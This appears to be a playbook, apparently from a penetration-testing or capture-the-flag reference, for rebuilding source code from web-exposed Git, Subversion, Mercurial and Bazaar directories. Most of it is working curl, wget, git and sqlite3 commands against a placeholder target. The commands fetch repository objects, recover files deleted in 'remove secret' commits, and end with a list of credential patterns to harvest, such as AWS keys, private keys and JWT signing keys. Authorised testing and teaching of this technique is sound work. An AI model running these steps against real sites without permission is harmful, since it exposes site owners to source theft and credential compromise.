# DVCS extraction procedures — Open WHEN: a `/.git/`, `/.svn/`, `/.hg/`, or `/.bzr/` artifact returns 200/403 and you must reconstruct source without a directory listing

Directory listing is usually OFF. The win is not browsing the folder — it is
that individual repository files are still readable by path, so you walk the
object graph yourself. A `403 Forbidden` on `/.git/` (common nginx `deny all`)
still means the files underneath are fetchable; confirm with
`/.git/HEAD`, `/.git/config`, `/.git/logs/HEAD`.

## Git (no directory listing)

Confirm exposure first:
```
curl -s http://TARGET/.git/HEAD        # -> "ref: refs/heads/main"
curl -s http://TARGET/.git/config      # remote URLs, sometimes creds in URL
curl -s http://TARGET/.git/logs/HEAD   # full commit-hash history, author emails
```

`/.git/logs/HEAD` lists every commit hash even after a "Remove flag" /
"Remove secret" commit — the old object is still on disk. Walk it manually:
```
git init loot && cd loot
# fetch a commit object by hash (first 2 hex = subdir, rest = filename)
wget http://TARGET/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
mkdir -p .git/objects/26 && mv e35470... .git/objects/26/
git cat-file -p 26e35470...        # -> tree hash, parent, author
# fetch the tree, then each blob the same way
git cat-file -p <tree-hash>        # -> mode blob <hash> filename
git cat-file -p <blob-hash>        # -> file contents (e.g. flag.txt, .env)
```
Target the commit BEFORE a "remove secret" commit — that is where the deleted
secret still lives.

Recover filenames + hashes from the index instead of guessing:
```
pip3 install gin
gin .git/index | egrep -e "name|sha1"   # name = path, sha1 = blob hash
```
Then fetch each blob via the `objects/<2>/<38>` path above.

Automated dumpers (use when available; otherwise the manual walk above works
with only `curl`/`wget` + `git`): `git-dumper`, `GitTools/gitdumper.sh`,
`GitHack`. After a full dump: `git checkout -- .` to materialise the worktree.

## Subversion (`.svn`)

Modern SVN stores everything in one SQLite DB:
```
curl http://TARGET/.svn/wc.db -o wc.db          # download the working-copy DB
sqlite3 wc.db "select local_relpath, checksum from NODES;"
```
Each `checksum` is `$sha1$<hash>`. To fetch the pristine file content:
- strip the `$sha1$` prefix
- the file lives at `/.svn/pristine/<first-2-hex>/<full-hash>.svn-base`
```
curl http://TARGET/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base
```
Legacy SVN (pre-1.7) instead exposes `/.svn/text-base/<file>.svn-base` and
`/.svn/entries`:
```
curl http://TARGET/.svn/text-base/wp-config.php.svn-base
```

## Mercurial (`.hg`) and Bazaar (`.bzr`)

Same idea — the store is web-readable. Check `/.hg/store/`, `/.hg/dirstate`
for Mercurial; `/.bzr/branch/`, `/.bzr/checkout/dirstate`,
`/.bzr/repository/pack-names` for Bazaar. The `dvcs-ripper` toolkit
(`rip-hg.pl`, `rip-bzr.pl`) and `bzr_dumper` automate the walk; `hg revert` /
`bzr revert` then writes the source tree back out.

## After extraction — harvest secrets from history

The reconstructed repo's full history is where secrets hide (committed then
"removed"). Grep the worktree and every past commit for:
`password`, `secret`, `api_key`, `AKIA`, `BEGIN PRIVATE KEY`, `.env`,
connection strings, JWT signing keys. See `references/secret-detection.md` for
the regex shapes worth grepping.
